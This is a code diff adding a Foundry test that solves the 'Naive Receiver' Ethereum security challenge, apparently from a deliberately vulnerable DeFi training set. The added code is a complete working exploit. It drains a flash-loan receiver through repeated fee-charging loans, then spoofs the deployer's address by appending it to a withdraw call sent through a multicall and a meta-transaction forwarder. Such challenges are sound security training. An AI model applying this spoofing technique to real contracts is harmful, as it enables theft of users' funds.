@@ -77,7 +77,53 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        // building multicall:
+        // first 10 calls drain 1 eth each as fees from naive flash loan receiver
+        // 11th call is staling moneh from pool
+        bytes[] memory calls = new bytes[](11);
         
+        // first 10: 
+        for (uint256 i = 0; i < 10; i++) {
+            calls[i] = abi.encodeCall(
+                NaiveReceiverPool.flashLoan,
+                (receiver, address(weth), 0, "")
+            );
+        }
+        
+        // manually append deployer address to this call!
+        // this gets delegatecalled: its msg.data will end with deployer address huehuehue
+        bytes memory withdrawCall = abi.encodeCall(
+            NaiveReceiverPool.withdraw,
+            (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
+        );
+        calls[10] = abi.encodePacked(withdrawCall, deployer);
+        
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player, 
+            target: address(pool),
+            value: 0,
+            gas: 1_000_000,
+            nonce: 0,
+            data: abi.encodeCall(Multicall.multicall, (calls)),
+            deadline: block.timestamp
+        });
+        
+        // Sign as player
+        bytes32 digest = keccak256(abi.encodePacked(
+            "\x19\x01",
+            forwarder.domainSeparator(),
+            forwarder.getDataHash(request)
+        ));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        
+        // forwarder will append 'player' to outer call,
+        // but the withdraw delegatecall has 'deployer' in ITS msg.data huehuehuehue
+        forwarder.execute(request, signature);
+        assertEq(weth.balanceOf(address(recovery)), WETH_IN_POOL + WETH_IN_RECEIVER);
+        assertEq(weth.balanceOf(address(player)), 0);
+        assertEq(weth.balanceOf(address(pool)), 0);
+        assertEq(weth.balanceOf(address(receiver)), 0);
     }
 
     /**
